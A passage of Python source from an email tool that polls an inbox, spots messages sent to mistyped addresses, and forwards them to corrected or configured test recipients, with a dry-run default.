            fixed_to_addresses=self.fix_addresses_typos(msg["to"]) # This returns a boolean and a list of addresses
            if (len(fixed_to_addresses)>0):
                # Send one email for each fixed address
                for (i,fixed_to) in enumerate(fixed_to_addresses):
                    # Forward email to fixed destinations for testing purposes
                    original_rcpt=msg["to"]
                    if ("fixed_destinations" in self.config["misc"].keys() and len(self.config["misc"]["fixed_destinations"])>0):
                        fake_msg.replace_header("To",",".join(self.config["misc"]["fixed_destinations"]))
                    else:
                        fake_msg.replace_header("To",fixed_to)

                    # If the flag "forward" is specified explicitly, we will forward the email
                    if (self.forward_emails):
                        # Send the message
                        self.logger.info("[%s] %s <-[us]-> %s" % (id, original_rcpt,fake_msg["To"]))
                        self.mailmanager.send_email(fake_msg)

                        # Set success flags
                        forwarded=True
                        reason="[%s] All Gucci %s <-[us]-> %s" % (id, original_rcpt,fake_msg["To"])
                    # If the flag is not explicitly set, we just make a dry run
                    else:
                        forwarded=False
                        reason="All good to forward to %s with tracking ID %s, but no --forward flag was specified"  % (fake_msg["To"],id)
                        self.logger.debug("Not forwarding the email. --forward flag not set.")
            else:
                forwarded=False
                reason="Typo fix rule not found"
        except Exception as e:
            forwarded=False
            reason="Error parsing original message: %s" % e
            self.logger.error("Error parsing the original message: %s" % e)

        return forwarded,fake_msg["To"],reason

    """
    Check if the message has an ignored subject
    """
    def forward_chain(self,msg: PythonEmailMessage):
        # Print details of the message
        self.log_msg_details(msg)
        # Forward the email
        forwarded,to,reason=self.forward_message(msg)
        # Alert operators
        self.notify_master(msg,forwarded,reason)
        if (forwarded):
            # Save this msguid as already observed
            self.flag_observed(msg["uid"])
        else:
            self.logger.error("The forwarding of email with subject '%s' was not possible: %s" % (msg["subject"],reason))

    """
    Check if the email is a valid email
    """
    def valid_email(self, address):            
        name,email = parseaddr(address)
        if (email is not None and len(email)>0):
            user,domain = email.split("@")
            return len(user)>0 and len(domain)>0
        else:
            return False

    """
    Iterate through the list of email addresses in the "to" field and check if they are valid
    """
    def valid_to(self,to):
        # The names of the recipients migth contain commas
        # So we need to take that case into account before splitting the string in multiple email addresses
        addresses = getaddresses([to])
        return all(map(lambda x: self.valid_email(x[1]), addresses))


    ##############
    # Monitoring #
    ##############            
    def monitor_inbox(self):
        """
        Inline function to search emails with a specific criteria
        Params:
            criteria: dict - It contains a dictionary with the criteria to search for
            Keys of the dictionary are: from_date, to_domains, from_domains, subject, ignore_seen
        """
        def search_with_criteria(criteria: dict):
            # offset=0
            number=10

            # Depending on the criteria, we will search emails from or to the domain
            # date_limit=date_from,domain_from=monitored_criteria,ignore_seen=False
            mails = self.mailmanager.fetch_emails(criteria,number=number)
            self.logger.info("Found %s emails with this criteria." % len(mails))
            if (len(mails)>0):
                self.logger.info("* First email received on the %s." % mails[0]["date"])
                self.logger.info("* Last email received on the %s." % mails[-1]["date"])
        
            while (len(mails)>0):
                # Iterate through the fetched emails of the last batch
                for msg in mails:
                    if self.valid_to(msg["to"]):
                        new_mail=self.is_new_email(msg["uid"])
                        recent_mail=self.is_recent(msg)
                        ignore_mail=self.ignore_mail(msg)
                        # Log the details of the email
                        self.logger.debug("Filter for of email %s:" % msg["uid"])
                        self.logger.debug("* Is new?: %s" % new_mail)
                        self.logger.debug("* Is recent?: %s (mail date: %s, date limit: %s)" % (recent_mail,msg["date"],self.date_limit))
                        self.logger.debug("* Should be ignored?: %s" % ignore_mail)
                        # If the email is new and recent, forward it
                        if (recent_mail and not ignore_mail):
                            if (not self.only_new):
                                self.forward_chain(msg)
                            else:
                                if new_mail:
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Skipping email %s (not new)." % msg["uid"])
                        else:
                            self.logger.debug("Skipping email %s (not recent or should be ignored)." % msg["uid"])
                    else:
                        self.logger.debug("Ignoring email %s - %s. Invalid recipients defined: %s" % (msg["uid"],msg["subject"],msg["to"]))
                
                # Set the date limit to the date of the last email fetched plus one minute
                criteria["from_date"] = datetime.strptime(mails[-1]["date"], '%a, %d %b %Y %H:%M:%S %z') + timedelta(minutes=1)
                
                # If we got the maximum number of emails, fetch the next batch
                if (len(mails)==number):
                    # Fetch the next batch of emails
                    mails = self.mailmanager.fetch_emails(criteria,number=number)
                    self.logger.info("Found %s emails with this criteria." % len(mails))
                    if (len(mails)>0):
                        self.logger.info("* First email received on the %s." % mails[0]["date"])
                        self.logger.info("* Last email received on the %s." % mails[-1]["date"])
                else:
                    self.logger.info("No more emails to fetch. Stopping the search.")
                    break
                    


        ############################
        # Never stop or stop monitoring if there's a date_limit defined and is still ahead of now
        ############################
        while (1):
            if (self.date_limit is not None and datetime.now() < self.date_limit.replace(tzinfo=None)):
                self.logger.info("Date limit is in the future. Stopping the monitoring")
                break
            else:
                # Iterate through all the 'monitor' keys in the configuration file
                for monitor in self.config["filter"]["monitor"].keys():
                    self.logger.info("################################")
                    self.logger.info("###### MONITORING BY '%s' ######" % monitor.upper())
                    self.logger.info("################################")
                    # Init the criteria dictionary afresh
                    base_criteria = {
                        "from_date": self.date_limit,
                        "ignore_seen": self.ignore_seen,
                        "from_domains": None,
                        "to_domains": None,
                        "subject": None
                    }
                    # The value of the monitor key is a list of criteria to search for
                    # Iterate through each value of the list 'monitor' key (e.g. a list of domains to monitor or a list of subjects)
                    for criteria_key in self.config["filter"]["monitor"][monitor]:
                        criteria=base_criteria.copy()
                        criteria[monitor]=criteria_key
                        search_with_criteria(criteria)

                # Every hour send a teams heartbeat message
                # heartbeat(config)
                print("Sleeping %s seconds" % self.poll_interval)
                self.countdown(self.poll_interval)
        
        # Date limit hit
        self.logger.info("Date limit reached. Stopping the monitoring")